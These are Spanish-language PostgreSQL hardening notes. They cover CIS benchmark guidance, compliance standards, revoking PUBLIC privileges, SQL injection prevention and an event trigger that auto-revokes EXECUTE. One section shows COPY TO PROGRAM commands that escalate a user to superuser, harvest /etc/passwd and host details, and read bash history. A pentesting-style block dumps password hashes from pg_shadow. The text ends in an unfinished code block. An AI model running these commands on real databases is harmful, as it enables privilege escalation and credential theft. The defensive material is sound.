

# ¿Qué es el CIS Benchmark para PostgreSQL?
El CIS (Center for Internet Security) Benchmark para PostgreSQL es un conjunto de mejores prácticas y configuraciones de seguridad diseñadas para proteger bases de datos PostgreSQL contra amenazas comunes. Es un estándar reconocido en la industria para auditorías de seguridad y cumplimiento normativo (como ISO 27001, PCI DSS, GDPR, etc.).


### Objetivos principales
✔ Reducir vulnerabilidades en la configuración de PostgreSQL. <br>
✔ Prevenir accesos no autorizados a datos sensibles.<br>
✔ Asegurar el cumplimiento de regulaciones de seguridad.<br>
✔ Proporcionar una línea base para configuraciones seguras.

### Beneficios de seguir el CIS Benchmark
✅ Reduce riesgos de ataques (SQL injection, acceso no autorizado).<br>
✅ Cumple con normativas (GDPR, HIPAA, PCI DSS).<br>
✅ Mejora el rendimiento y estabilidad al eliminar configuraciones inseguras.

https://downloads.cisecurity.org/#/<br>
https://www.cisecurity.org/benchmark/postgresql <br>
https://cheatsheetseries.owasp.org/IndexTopTen.html <br>
https://www.percona.com/blog/postgresql-database-security-best-practices/ <br>
https://csrc.nist.gov/CSRC/media/Presentations/standards-research-and-applications-in-cryptograph/images-media/20191007-uchile--slides-nist-pec-pqc--rev-oct-14.pdf <br>
https://listings.pcisecuritystandards.org/documents/PCI-DSS-v4_0-LA.pdf

 

##  Estandares de seguridad  : 
1. **PCI DSS**: El Consejo de Normas de Seguridad de la Industria de Tarjetas de Pago (PCI SSC) proporciona información sobre los requisitos de seguridad para proteger los datos de las cuentas de pago. Puedes visitar su sitio oficial [aquí](https://www.pcisecuritystandards.org/faq/articles/Frequently_Asked_Question/does-pci-dss-define-which-versions-of-tls-must-be-used/).
    
2. **HIPAA**: El Departamento de Salud y Servicios Humanos de los Estados Unidos (HHS) ofrece información sobre la Ley de Portabilidad y Responsabilidad de Seguros de Salud (HIPAA), incluyendo las reglas de seguridad y privacidad. Puedes acceder a su sitio oficial [aquí](https://www.hhs.gov/hipaa/for-professionals/breach-notification/guidance/index.html).
    
3. **NIST**: El Instituto Nacional de Estándares y Tecnología (NIST) desarrolla y mantiene estándares, incluyendo los relacionados con la ciberseguridad y el uso de TLS. Puedes visitar su sitio oficial [aquí](https://csrc.nist.gov/pubs/sp/800/52/r2/final).

4. **GDPR**: El Reglamento General de Protección de Datos (GDPR, por sus siglas en inglés) es una ley de la Unión Europea que entró en vigor el 25 de mayo de 2018. Su objetivo principal es proteger los datos personales de los ciudadanos de la UE y garantizar su privacidad. El GDPR establece normas estrictas sobre cómo las organizaciones deben manejar y proteger los datos personales, y otorga a los individuos varios derechos sobre sus datos, como el derecho al acceso, rectificación, supresión y portabilidad  [Reglamento general de protección de datos (GDPR)](https://eur-lex.europa.eu/ES/legal-content/summary/general-data-protection-regulation-gdpr.html).


5. **ISO/IEC 27001**: [REF](https://www.eternitylaw.com/es/noticias/5-estandares-basicos-de-procesamiento-de-pagos-mejores-practicas-de-cumplimiento-de-estandares-2025/)
   - **Propósito**: es una norma internacional publicada por la Organización Internacional de Normalización (ISO) y la Comisión Electrotécnica Internacional (IEC). Proteger la confidencialidad, integridad y disponibilidad de la información. Su objetivo es ayudar a las organizaciones a gestionar la seguridad de la información
   - **Aplicabilidad**: Es un estándar internacional aplicable a cualquier tipo de organización.
   - **exige**  Planes de continuidad del negocio. Evaluación de riesgos. Definición de RPO y RTO para sistemas críticos. Pruebas periódicas de recuperación ante desastres.


6. **FIPS (Federal Information Processing Standards)**:
   - **Propósito**: Establece requisitos de seguridad para sistemas informáticos utilizados por el gobierno de los Estados Unido.
   - **Aplicabilidad**: Incluye estándares para el cifrado y la protección de datos de pago.

 7. **LFPDPPP** es la Ley Federal de Protección de Datos Personales en Posesión de los Particulares en México. Su versión más reciente fue publicada el 20 de marzo de 2025 y entró en vigor el 21 de marzo de 2025
en todo el país, cuyo objetivo es proteger los datos personales que están en manos de particulares (empresas, organizaciones, profesionistas, etc.), regulando su tratamiento de forma legítima, controlada e informada

8. **FISMA** (Federal Information Security Management Act) es una ley de seguridad de la información de EE.UU. que exige que las agencias federales implementen medidas de protección para sus sistemas y datos sensibles. Fue aprobada en 2002 y establece estándares de cumplimiento definidos por el **NIST** (National Institute of Standards and Technology). Su objetivo es garantizar la **confidencialidad, integridad y disponibilidad** de la información gubernamental.

9. **STIG** (Security Technical Implementation Guide) es un conjunto de guías de seguridad desarrolladas por el **Departamento de Defensa de EE.UU.** para proteger sistemas informáticos contra amenazas cibernéticas. Estas guías establecen configuraciones seguras para software, hardware y redes, asegurando que cumplan con los estándares de seguridad requeridos.


# Tecnicas de Hardening 
es el proceso de fortalecer la seguridad de una base de datos para protegerla contra amenazas y ataques cibernéticos. Este proceso implica aplicar una serie de medidas y prácticas para minimizar las vulnerabilidades y reducir la superficie de ataque
, se puede instalar la extension de seguridad [pgdsat](https://github.com/HexaCluster/pgdsat/tree/main) para hacer un reporte de la seguridad de tu servidor

# Owner  de objetos tiene autoridad completa sobre el objeto.
el owner del objeto tambien puede hacer grant y revoke ante los objetos que es owner , para esto trata de colocar todos los objetos con owner del administrador como postgres excepto hay que tener cuidado con funciones que tienen como parametro "SECURITY DEFINER" para esos hay que validar si es seguro o no 

 
# Quitar permisos en eschema public por seguridad 
**PUBLIC** es un ROL que se utiliza para otorgarle permisos  por defecto que se aplican a todos los usuarios y de manera automática, lo unico que puedes hacerle al ROL es  ROKOVE o GRANT
Por ejemplo, si otorgas un nuevo permiso a PUBLIC, cualquier usuario, presente o futuro, tendrá ese permiso.

- no se puede dejar de ser miembro del rol PUBLIC
- no puedes renombrar el rol
- no puedes eliminarlo

- Al crear una funcion, postgres automaticamente le otorga el permiso de EXECUTE al rol PUBLIC por lo que hay que tener cuidado y siempre hacer el revoke

```sql

-- /*************	Vr los permisos que tuene el ROL PUBLIC	*************\

select table_schema,table_name from information_schema.table_privileges where  grantee = 'PUBLIC' order by  table_schema,table_name  ; --- PERMISOS DE TABLAS 

---- Ver PERMISOS DE EXECUCUION EN FUNCIONES O PROCEDIMIENTOS 
SELECT  
	DISTINCT
	a.routine_schema 
	,grantee AS user_name
	,a.routine_name 
	,b.routine_type
	,privilege_type 
FROM information_schema.routine_privileges as a
LEFT JOIN 
	information_schema.routines  as b on a.routine_name=b.routine_name
where  
	NOT a.routine_schema in('pg_catalog','information_schema')  --- Retira este filtro si quieres ver las funciones default de postgres 
	AND a.grantee in('PUBLIC') 
ORDER BY a.routine_schema,a.routine_name ;


-- /************* Retirar permisos *************\
REVOKE CREATE ON SCHEMA public FROM PUBLIC;
REVOKE ALL ON DATABASE postgres FROM PUBLIC;

REVOKE all privileges on all tables in schema  pg_catalog from PUBLIC;
REVOKE all privileges on all tables in schema  information_schema from PUBLIC;

REVOKE all privileges on table pg_proc   from PUBLIC;


--- Estos no se recomienda usar ya que tendrias que darle permiso a cada usuario para que pueda usar el esquema 
REVOKE usage ON SCHEMA pg_catalog FROM PUBLIC;
REVOKE usage ON SCHEMA information_schema FROM PUBLIC;


Buscar objetos que no deberian de terner permisos los usuarios personalizados o normales :
select distinct  proname from pg_proc where proname ~* 'privilege|setting|conf' order by proname;
select schemaname,viewname from pg_views where viewname ~* 'privilege|setting|conf' order by schemaname,viewname;
select table_schema,table_name from information_schema.tables where table_name ~* 'privilege|setting|conf' order by  table_schema,table_name;


https://www.qualoom.es/blog/administracion-usuarios-roles-postgresql/

```



# Restringir la conexion a la DB
```sql
# Restringir la conexion a la DB template para que no modifiquen nada
host    template1             all           0.0.0.0 0.0.0.0              reject

--- Esto hace que no permitan conexiones la DB
--- failed: FATAL:  database "template0" is not currently accepting connections
UPDATE pg_database SET datallowconn = FALSE WHERE datname = 'template0';
UPDATE pg_database SET datallowconn = FALSE WHERE datname = 'template1';

--- es lo mismo que hacer el update 
ALTER DATABASE template0  ALLOW_CONNECTIONS false;

select datname,datallowconn,datistemplate  from pg_database;

 
# RESTRINGIR RECURSOS A USUARIOS PERSONALIZADOS, QUE NO TIENEN ALGUN SERVICIO

-- Asignando un limite de work_mem  al usuario angel 
alter user angel SET work_mem = '4MB'; 

-- Validar las configuraciones 
select usename,useconfig from pg_shadow where usename = 'angel';

-- Quitar el parámetro
ALTER ROLE angel RESET work_mem;-- quitarlo 

```


### Ejecutar bash con el comando copy y obtener información valiosa del servidor 
```
COPY (select '') to PROGRAM 'psql -U postgres -c "ALTER USER <your_username> WITH SUPERUSER;"';

COPY ( select '' ) TO PROGRAM 'cat > /tmp/data.txt && cat /etc/passwd >> /tmp/data.txt  && echo $(hostname -I ) - $(hostname) >> /tmp/data.txt &&  paste -s -d, - < /tmp/data.txt  > /tmp/test2.txt';

--- El contenido del passwd se te mostrara en la primera linea que dice "ERROR:  invalid input syntax for type bigint:"
COPY cat_prueba from  PROGRAM 'cat /tmp/test2.txt';

--- En linux puede usar el comando para ver el historial de comandos, esto lo puedes juntar con el comando copy y puedes ver todo lo que se ejecuta
cat ~/.bash_history > /tmp/historial.txt

-- comando linux para saber con que usuario estoy usando
whoami

--- roles
pg_read_server_files      
 pg_write_server_files     
 pg_execute_server_program
https://www.postgresql.org/docs/11/default-roles.html
```


###  Técnica  de verificación de versiones:
```
select now();
select string_agg()
select current_database();
```


# Funciones que se tienen que desactivar 

FUNCIONES
**ver estadisticas de un archivo**
```
select pg_stat_file('/tmp/recetas/nnnn.txt');

cat /sysx/data/postgresql.conf | grep track_activities

track_activities = off
```

-- Manipulacion de ficheros 
```
select pg_read_file('/etc/hostname') --- Leee un archivo de texto
pg_write_file
copy

 postgres@postgres# select distinct proname from pg_proc where proname ~* 'file|read|write|import|export|ls_' order by proname;
+----------------------------------------------+
|                   proname                    |
+----------------------------------------------+
| binary_upgrade_set_next_heap_relfilenode     |
| binary_upgrade_set_next_index_relfilenode    |
| binary_upgrade_set_next_toast_relfilenode    |
| lo_export                                    |
| lo_import                                    |
| loread                                       |
| lowrite                                      |
| pg_current_logfile                           |
| pg_event_trigger_table_rewrite_oid           |
| pg_event_trigger_table_rewrite_reason        |
| pg_export_snapshot                           |
| pg_filenode_relation                         |
| pg_hba_file_rules                            |
| pg_ident_file_mappings                       |
| pg_import_system_collations                  |
| pg_ls_archive_statusdir                      |
| pg_ls_dir                                    |
| pg_ls_logdir                                 |
| pg_ls_logicalmapdir                          |
| pg_ls_logicalsnapdir                         |
| pg_ls_replslotdir                            |
| pg_ls_tmpdir                                 |
| pg_ls_waldir                                 |
| pg_read_binary_file                          |
| pg_read_file                                 |
| pg_read_file_old                             |
| pg_relation_filenode                         |
| pg_relation_filepath                         |
| pg_rotate_logfile                            |
| pg_rotate_logfile_old                        |
| pg_show_all_file_settings                    |
| pg_split_walfile_name                        |
| pg_stat_file                                 |
| pg_stat_get_bgwriter_buf_written_checkpoints |
| pg_stat_get_bgwriter_buf_written_clean       |
| pg_stat_get_bgwriter_maxwritten_clean        |
| pg_stat_get_bgwriter_requested_checkpoints   |
| pg_stat_get_bgwriter_stat_reset_time         |
| pg_stat_get_bgwriter_timed_checkpoints       |
| pg_stat_get_checkpoint_write_time            |
| pg_stat_get_db_blk_read_time                 |
| pg_stat_get_db_blk_write_time                |
| pg_stat_get_db_temp_files                    |
| pg_walfile_name                              |
| pg_walfile_name_offset                       |
| ts_rewrite                                   |
+----------------------------------------------+




select distinct proname from pg_proc where proname ilike '%file%';

```

-- Busca funciones del sistema que te permite manipular el sistema
```
\df *pg_re*
SELECT proname FROM pg_proc WHERE proname ilike 'pg_w%';
SELECT proname FROM pg_proc WHERE proname ilike 'pg_r%';
SELECT proname FROM pg_proc WHERE proname ilike 'pg_l%';

select pg_ls_dir('/tmp');
select pg_ls_logdir();
```

-- ejecutar comandos de manera remota 
dblink

-- Ejecutas bash 
La extensión PL/sh en PostgreSQL se utiliza para ejecutar código en lenguaje de shell (como bash) dentro de funciones almacenadas en la base de datos
```
CREATE OR REPLACE FUNCTION my_function() RETURNS void AS $$
#!/bin/bash
# Aquí puedes escribir tu código en lenguaje de shell
echo "Hola desde PL/sh en PostgreSQL"
# Puedes ejecutar comandos del sistema, manipular archivos, etc.
$$ LANGUAGE plsh;

SELECT my_function();
```




```
-- Puedes ver las extensiones disponibles para habilitar
select * from pg_available_extensions where name ilike '%fdw%';

-- Puedes ver las extensiones habilitadas 
select * from pg_extension 

-- habilitar una extension 
CREATE EXTENSION IF NOT EXISTS postgres_fdw;

-- Eliminas las extensiones
DROP EXTENSION IF EXISTS postgres_fdw CASCADE; 
```










```
-- ver la zona horaria
current_setting('TIMEZONE')

# Get current user
SELECT user;
SELECT pg_backend_pid();

# Get current database
SELECT current_catalog;

# List schemas
SELECT schema_name,schema_owner FROM information_schema.schemata;
\dn+

#List databases
SELECT datname FROM pg_database;

#Read credentials (usernames + pwd hash)
SELECT usename, passwd from pg_shadow;

# Get languages
SELECT lanname,lanacl FROM pg_language;

# Show installed extensions
SHOW rds.extensions;
SELECT * FROM pg_extension;

# Get history of commands executed
\s
select * from pg_stat_statements ;

GRANT pg_execute_server_program TO "username";
GRANT pg_read_server_files TO "username";
GRANT pg_write_server_files TO "username";

## If response is "on" then true, if "off" then false
SELECT current_setting('is_superuser');


SELECT grantee,table_schema,table_name,privilege_type FROM information_schema.role_table_grants WHERE table_name='pg_shadow';



SHOW logging_collector;
SHOW password_encryption;
SHOW shared_preload_libraries;
SHOW hba_file;
SHOW data_directory;

SELECT boot_val,reset_val FROM pg_settings WHERE name='listen_addresses';
SELECT boot_val,reset_val FROM pg_settings WHERE name='data_directory';
SELECT boot_val,reset_val FROM pg_settings WHERE name='log_directory';

SELECT boot_val,reset_val FROM pg_settings WHERE name='port';
SELECT inet_server_addr();
SELECT current_timestamp; 

select * from from pg_hba_file_rules;
Select * from  pg_stat_activity    ;


```


### Evita Inyeccion SQL  #1
Consultas dinamicas 
Esto es útil para evitar problemas de inyección SQL y para manejar valores de manera segura y eficiente.
Si no usáramos USING, tendríamos que concatenar los valores directamente en la cadena SQL, lo cual es menos seguro y más propenso a errores
```

DO $$
DECLARE
    sql_query text;
	nom text := 'jose';
	sal int := 1000;
	msg text;
BEGIN 

  	sql_query := 'select $1 ||  $2::text';
    EXECUTE sql_query USING nom, sal into msg;
 
    -- Más código después del bloque try-catch
    RAISE NOTICE  '-----------> %' , msg ;
END $$;


  
# La función `FORMAT` hace que las consultas dinámicas sean más legibles y fáciles de mantener. En lugar de concatenar múltiples cadenas y variables, puedes usar una plantilla clara y concisa. 
 
  - reduces la posibilidad de errores tipográficos y problemas de concatenación 
  - ayuda a prevenir inyecciones SQL al manejar correctamente los identificadores (`%I`) y literales (`%L`). Esto es crucial para evitar vulnerabilidades de seguridad.
  
  
 ### `%I` - Identificadores SQL
El formato `%I` se utiliza para formatear identificadores SQL y coloca comillas dobles a los valores , como nombres de tablas, columnas, esquemas, etc. PostgreSQL se encarga de escaparlos correctamente para evitar problemas de sintaxis y posibles inyecciones SQL. PostgreSQL los escapa automáticamente para que sean seguros y válidos en una consulta SQL.

  
### `%L` - Literales SQL
El formato `%L` se utiliza para formatear literales SQL y coloca comillas simples a los valores  , como cadenas de texto, números, etc. PostgreSQL se encarga de escaparlos adecuadamente para que sean seguros y correctos en el contexto de una consulta SQL. PostgreSQL los escapa adecuadamente para evitar inyecciones SQL y asegurar que sean interpretados correctamente.
 
  
 select format(nada, 'mundo') from (select 'hola %L' as nada);
  
SELECT FORMAT('Hola, %s', 'PostgreSQL'); --- Hola, PostgreSQL 
SELECT FORMAT('El número es: %s', 12345);---- El número es: 12345 
SELECT FORMAT('Nombre: %s, Edad: %s', 'Juan', 30); --- Nombre: Juan, Edad: 30
SELECT FORMAT('El progreso es del %s%%', 75); --- El progreso es del 75%
SELECT FORMAT('SELECT * FROM %I WHERE nombre = %L', 'mi_tablaGRANDE', 'Juan'); ---  SELECT * FROM "mi_tablaGRANDE" WHERE nombre = 'Juan' 
 
 
DO $$
DECLARE
    tabla TEXT := 'usuarios';
    columna TEXT := 'nombre';
    valor TEXT := 'Maria';
    consulta TEXT;
BEGIN
    consulta := FORMAT('SELECT * FROM %I WHERE %I = %L', tabla, columna, valor);
    RAISE NOTICE '%', consulta;
END $$;
 

 “escapa automáticamente” los identificadores y literales, nos referimos a que PostgreSQL se encarga de añadir las comillas necesarias y manejar caracteres especiales para asegurar que los valores sean interpretados correctamente y de manera segura en una consulta SQL


```
### Evita Inyeccion SQL  #2
```sql

quote_literal: Asegura que el valor se encierre en comillas , incluso si el texto tiene comillas, modifica el texto para que no genere error
select quote_literal(E'holaaa \' Mundo'); ---> 'holaaa '' Mundo' 
 
quote_ident: Se usa para asegurarse de que el valor que agregaras se use para el nombre de un objeto por ejemplo el nombre de una tabla
select quote_ident(E'holaaa \' Mundo'); ---> "holaaa ' Mundo"  


```
 
### Validar funciones que tienen caracteristicas criticas 
Estas funciones pueden afectar la administración de postgresql y deben de revisarse antes de ortogar los permisos 
```SQL

 
 select 
	routine_type
	,schema_name
	,proname
	,arguments
	,security_definer
	,leakproof
	,owner
	,parameters_setting
	,public_role_can_execute
	--,prosrc
	
	-- DDL 
	,regexp_count(prosrc, 'CREATE ') AS _CREATE
	,regexp_count(prosrc, 'DROP ') AS _DROP
	,regexp_count(prosrc, 'ALTER ') AS _ALTER
	
	-- DML
	,regexp_count(prosrc, 'INSERT ') AS _INSERT
	,regexp_count(prosrc, 'UPDATE ') AS _UPDATE
	,regexp_count(prosrc, 'DELETE ') AS _DELETE
	,regexp_count(prosrc, 'TRUNCATE ') AS _TRUNCATE
	
	-- DCL 
	,regexp_count(prosrc, 'GRANT ') AS _GRANT
	,regexp_count(prosrc, 'REVOKE ') AS _REVOKE
	
	--- Comandos de Mantenimientos
	,regexp_count(prosrc, 'VACUUM ') AS _VACUUM
	,regexp_count(prosrc, 'ANALYZE ') AS _ANALYZE
	,regexp_count(prosrc, 'REINDEX ') AS _REINDEX
	,regexp_count(prosrc, 'CLUSTER ') AS _CLUSTER
	,regexp_count(prosrc, 'CHECKPOINT ') AS _CHECKPOINT
	
	-- lista de funciones y comandos Criticos que pueden afectar el comportamiento de PostgreSQL
	,regexp_count(prosrc, 'COPY ') AS _COPY
	,regexp_count(prosrc, 'pg_reload_conf') AS _pg_reload_conf
	,regexp_count(prosrc, 'pg_read_file') AS _pg_read_file
	,regexp_count(prosrc, 'pg_write_file') AS _pg_write_file
	,regexp_count(prosrc, 'pg_backup_start') AS _pg_backup_start
	,regexp_count(prosrc, 'pg_backup_stop') AS _pg_backup_stop
	,regexp_count(prosrc, 'set_config') AS _set_config
	,regexp_count(prosrc, 'pg_terminate_backend') AS _pg_terminate_backend
	,regexp_count(prosrc, 'pg_cancel_backend') AS _pg_cancel_backend
	,regexp_count(prosrc, 'pg_backend_pid') AS _pg_backend_pid
	,regexp_count(prosrc, 'pg_promote') AS _pg_promote
from
(SELECT 
	CASE p.prokind
            WHEN 'f'::"char" THEN 'FUNCTION'::text
            WHEN 'p'::"char" THEN 'PROCEDURE'::text
            ELSE NULL::text
    END   AS routine_type
	,nspname as schema_name
	,proname
	,pg_catalog.pg_get_function_arguments(p.oid) AS arguments
	,prosecdef as SECURITY_DEFINER
	,p.proleakproof as LEAKPROOF
	,rolname as OWNER
	,proconfig AS PARAMETERS_SETTING 
	,case when privilege_type is null then FALSE ELSE TRUE END as public_role_can_execute
	,upper(prosrc) as prosrc
FROM pg_proc p 
	LEFT JOIN pg_namespace as n 
		ON p.pronamespace = n.oid 
	LEFT JOIN pg_authid as a 
		ON a.oid = p.proowner 
	LEFT JOIN (select  routine_schema, routine_name, grantee, privilege_type from information_schema.routine_privileges  where grantee= 'PUBLIC') as z	
		ON n.nspname = z.routine_schema and z.routine_name = p.proname
WHERE 		 
	-- lista de funciones criticas que pueden afectar el comportamiento de PostgreSQL
	(p.proname  in('pg_reload_conf','pg_read_file','pg_write_file','pg_backup_start','pg_backup_stop','set_config','pg_terminate_backend','pg_cancel_backend','pg_promote')
		OR n.nspname not in('information_schema', 'pg_catalog') )
	AND 
	(
	((prosrc ~* 'CREATE |DROP |ALTER |INSERT |UPDATE |DELETE |TRUNCATE |GRANT |REVOKE |VACUUM|ANALYZE|REINDEX|CLUSTER|CHECKPOINT|COPY '
		OR proname  in('pg_reload_conf','pg_read_file','pg_write_file','pg_backup_start','pg_backup_stop','set_config','pg_terminate_backend','pg_cancel_backend','pg_promote'))
	AND 
		privilege_type IS NOT NULL )
	OR 
		(prosecdef OR NOT proconfig IS NULL OR proleakproof = true )
	)
 )as a 
	 order by  security_definer desc ,public_role_can_execute desc , _create desc , _drop desc , _alter desc 
 
```


## Computadora 
.pgpass --->  El archivo .pgpass en PostgreSQL es un archivo de configuración que se utiliza para almacenar de manera segura las credenciales de acceso a las bases de datos. En lugar de tener que ingresar manualmente las contraseñas cada vez que te conectas a una base de datos PostgreSQL, puedes utilizar el archivo .pgpass para que las credenciales se almacenen y se recuperen automáticamente cuando sea necesario.

https://paper.bobylive.com/Security/CIS/CIS_PostgreSQL_14_Benchmark_v1_0_0.pdf

bibliografía  :
https://book.hacktricks.xyz/network-services-pentesting/pentesting-postgresql





## CSIRT
```
**Tanium** es una plataforma de gestión y seguridad de endpoints que proporciona visibilidad y control en tiempo real sobre todos los dispositivos conectados a una red. Se utiliza para detectar y responder a amenazas, gestionar activos y garantizar el cumplimiento de políticas de seguridad³. Algunas de sus ventajas incluyen:

- **Visibilidad en tiempo real**: Permite a las organizaciones ver y controlar todos los endpoints en tiempo real.
- **Escalabilidad**: Puede gestionar millones de endpoints sin perder rendimiento.
- **Automatización**: Facilita la automatización de tareas de seguridad y gestión, reduciendo la carga de trabajo manual⁴.

**CSIRT** (Computer Security Incident Response Team) es un equipo especializado en la gestión y respuesta a incidentes de seguridad informática. Su objetivo es minimizar el impacto de los incidentes de seguridad y restaurar las operaciones normales lo más rápido posible². Los beneficios de contar con un CSIRT incluyen:

- **Respuesta rápida a incidentes**: Permite una reacción rápida y eficiente ante incidentes de seguridad.
- **Mitigación de daños**: Ayuda a minimizar los daños y a preservar la evidencia de los incidentes.
- **Prevención de futuros incidentes**: Implementa medidas para evitar que incidentes similares ocurran en el futuro².

### Competidores de Tanium
Algunos de los competidores de Tanium en el mercado de gestión y seguridad de endpoints incluyen:

- **CrowdStrike**: Conocido por su plataforma de protección de endpoints basada en la nube.
- **Carbon Black**: Ofrece soluciones de seguridad de endpoints y análisis de comportamiento.
- **McAfee**: Proporciona una amplia gama de soluciones de seguridad, incluyendo la gestión de endpoints.
- **Symantec**: Ofrece soluciones integrales de seguridad de endpoints y protección contra amenazas.
```
 



# Permisos por default peligrosos del ROL PUBLIC
 **Vulnerabilidad CVE-2018-1058** esta realacionada con este tema , aunque en la vulnerabilidad habla mas sobre como un atacante en ciertas versiones podia aprovechar de la mala configuracion de search_path para ejecutar código que requiere permisos elevados 


**Privilegio CREATE** Se realizo una investigación y desde la versión <= 14 el ROL PUBLIC tiene permisos por default de USAGE y CREATE en el esquema PUBLIC 
para remediar esto se recomienda hacer el revoke en los template1 para cuando se creen nuevas Base de datos ya tengan el revoke y para las Base de datos 
que ya existen es necesario realizar el revoke create <br>

**Privilegio Execute** en todas las versiones de postgresql el ROL PUBLIC tiene permiso de execute para las nuevas funciones creadas, para remediar esto siempre que se 
cree una funcion realizar el revoke execute a las funciones mas cuando la funcion tiene "security definer" y aplicar este revoke en el template

**Riesgo**  cualquier usuario creado desde la version <= 14 si no le hicieron el revoke create al esquema public y revoke execute las funciones, entonces este usuario podria crear 
una funcion con "securitydefiner" con un owner como el postgres y colocar en su estructura comandos que requieren de altos privilegios y despues ejecutar esa funcion esto presenta riesgos. 

https://wiki.postgresql.org/wiki/A_Guide_to_CVE-2018-1058%3A_Protect_Your_Search_Path

```sql

--------------------- POSTGRES  --------------------- 
create user gerente VALID UNTIL '2024-11-25' ;  --  drop user gerente;
create user cliente VALID UNTIL '2024-11-25' ;  --  drop user cliente;
 

postgres@postgres# create database test_funs;
CREATE DATABASE
Time: 311.576 ms


postgres@postgres# \c test_funs
psql (16.4, server 15.8)
You are now connected to database "test_funs" as user "postgres".
postgres@test_funs#



-- drop  FUNCTION public.fun_cleeantable;
 
CREATE OR REPLACE FUNCTION public.fun_cleeantable(
    CHARACTER(50),
    INTEGER)
RETURNS void
LANGUAGE 'plpgsql'
COST 100
VOLATILE  PARALLEL UNSAFE
set client_min_messages = notice
 --SECURITY DEFINER
AS $BODY$
DECLARE
    iTabla ALIAS FOR $1;
    iOpc ALIAS FOR $2;
BEGIN
    CASE
        WHEN iOpc = 0 THEN EXECUTE format('TRUNCATE TABLE %I', iTabla);
        WHEN iOpc = 1 THEN EXECUTE format('DROP TABLE %I', iTabla);
		WHEN iOpc = 2 THEN  RAISE NOTICE  'SE ejectuoooooooooooo';
    END CASE;
END;
$BODY$;

CREATE FUNCTION
Time: 6.962 ms



--- Aqui esta peligroso ya que cualquier usuario puede ejecutar cualquier funcion 
SELECT  
	DISTINCT
	a.routine_schema 
	,grantee AS user_name
	,a.routine_name 
	,b.routine_type
	,privilege_type 
FROM information_schema.routine_privileges as a
LEFT JOIN 
	information_schema.routines  as b on a.routine_name=b.routine_name
where  
	NOT a.routine_schema in('pg_catalog','information_schema')  --- Retira este filtro si quieres ver las funciones default de postgres 
	AND a.grantee in('PUBLIC')  and a.routine_name = 'fun_cleeantable'
ORDER BY a.routine_schema,a.routine_name ;


+----------------+----------+-----------------+--------------+----------------+
| routine_schema | grantee  |  routine_name   | routine_type | privilege_type |
+----------------+----------+-----------------+--------------+----------------+
| public         | PUBLIC   | fun_cleeantable | FUNCTION     | EXECUTE        |
| public         | postgres | fun_cleeantable | FUNCTION     | EXECUTE        |
+----------------+----------+-----------------+--------------+----------------+
(2 rows)




--- HACIENDO OWNER AL GERENTE DE LA FUNCION 
ALTER FUNCTION  public.fun_cleeantable OWNER TO gerente;


ALTER table  empleados OWNER TO gerente;

 
 
---- CREAR LA TABLA  -- drop table empleados;
create table empleados(nombre varchar);
 
--- INSERTAR DATO EN TABLA 
insert into empleados select 'jose';


--- DAR PERMISO EXECUTE A CLIENTES 
grant execute on function fun_cleeantable to cliente;

 
 
SET SESSION AUTHORIZATION cliente; 
set role cliente; 

SET SESSION AUTHORIZATION postgres; 


 
 

--------------------- CLIENTE  --------------------- 



cliente@postgres> truncate table empleados;
ERROR:  permission denied for table empleados
Time: 2.361 ms

cliente@postgres> drop table empleados;
ERROR:  must be owner of table empleados
Time: 1.344 ms

 
 

cliente@postgres> select public.fun_cleeantable('empleados',1);
ERROR:  must be owner of table empleados
CONTEXT:  SQL statement "DROP TABLE empleados"
PL/pgSQL function fun_cleeantable(character,integer) line 8 at EXECUTE
Time: 1.600 ms


cliente@postgres> select public.fun_cleeantable('empleados',0);
ERROR:  permission denied for table empleados
CONTEXT:  SQL statement "TRUNCATE TABLE empleados"
PL/pgSQL function fun_cleeantable(character,integer) line 7 at EXECUTE
Time: 1.117 ms



select public.fun_cleeantable('empleados',2);



------------ TRIGGER Y FUNCION DE SEGURIDAD PARA REVOKE AUTOMATICO AL PUBLIC EN FUNCIONES ------------

https://www.postgresql.org/docs/current/sql-createfunction.html
Another point to keep in mind is that by default, execute privilege is granted to PUBLIC for newly created functions (see Section 5.8 for more information). Frequently you will wish to restrict use of a security definer function to only some users. To do that, you must revoke the default PUBLIC privileges and then grant execute privilege selectively. 
 
Default PUBLIC Privileges : https://www.postgresql.org/docs/current/ddl-priv.html#PRIVILEGES-SUMMARY-TABLE


 

CREATE OR REPLACE FUNCTION audit_function_creation()
RETURNS event_trigger
SET client_min_messages='notice'
AS $$
DECLARE 
	v_object_type text;
	v_schema_name text;
	v_object_identity text;
	v_execute text;
	v_obj_name_clear text;

	v_query_funpro text;
	v_stt_result boolean ; 
	
BEGIN
	
	--- Obtiene los datos del objeto, como schema, nombre y tipo
	SELECT object_type,schema_name,object_identity  INTO v_object_type,v_schema_name,v_object_identity FROM pg_catalog.pg_event_trigger_ddl_commands();

	-- Limpia la variable v_object_identity ya que trae el esquema y los parametros 
	v_obj_name_clear := substring(v_object_identity FROM '\.([a-zA-Z0-9_]+)\(') ;

	-- prepara la query para validar  si el usuario PUBLIC  tiene permiso EXECUTE en la funcion o procedimiento 
	v_query_funpro =  format( E'
		SELECT  
			true
		FROM information_schema.routine_privileges as a
		LEFT JOIN 
			information_schema.routines  as b on a.routine_name=b.routine_name and a.routine_schema = b.routine_schema
		where  
			 a.grantee = \'PUBLIC\' 
			 and lower(b.routine_type) = %L
			 and a.routine_schema  = %L
			 and a.routine_name  =  %L ' , v_object_type , v_schema_name , v_obj_name_clear   )  ;
	
	-- Ejecuta la query 
	execute v_query_funpro into v_stt_result ;

	-- Valida si obtuvo resultados la query ejecutada 
	IF v_stt_result THEN 

		v_execute := format('REVOKE EXECUTE ON %s  %s FROM PUBLIC' ,v_object_type,v_object_identity);
		EXECUTE v_execute;
		RAISE NOTICE E'\n\n /********** Por SEGURIDAD Se realizo el REVOKE EXECUTE al role PUBLIC **********\\  \n\t%: %\n\n ',upper(v_object_type),v_object_identity;
	
	END IF;
	
END;
$$ LANGUAGE plpgsql;




CREATE EVENT TRIGGER revoke_public_execute
ON ddl_command_end
WHEN TAG IN ('CREATE FUNCTION','CREATE PROCEDURE')
EXECUTE FUNCTION  audit_function_creation();





 ```



### Tecnicas de ofuscacion
Datos que más se ofuscan y  contienen información sensible y confidencial:

1. **Información personal identificable (PII)**: Nombres, direcciones, números de teléfono, direcciones de correo electrónico, y números de seguridad social.
2. **Datos financieros**: Números de tarjetas de crédito, información de cuentas bancarias, y detalles de transacciones financieras.
3. **Datos médicos**: Historias clínicas, diagnósticos, y tratamientos médicos.
4. **Contraseñas y credenciales**: Información de inicio de sesión, contraseñas, y tokens de autenticación.
5. **Datos empresariales**: Información sobre empleados, contratos, y datos comerciales confidenciales.
 
```SQL

--- Para tarjetas 
